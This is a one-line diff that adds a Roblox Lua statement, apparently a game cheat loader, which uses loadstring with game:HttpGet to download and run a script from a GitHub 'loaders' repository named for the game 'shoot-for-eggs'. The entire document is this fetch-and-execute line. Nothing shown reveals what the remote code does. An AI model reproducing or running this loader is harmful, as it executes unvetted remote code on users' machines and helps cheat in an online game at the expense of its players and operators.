@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/shoot-for-eggs-spam4-tnyfffejiy8thl.lua"))()
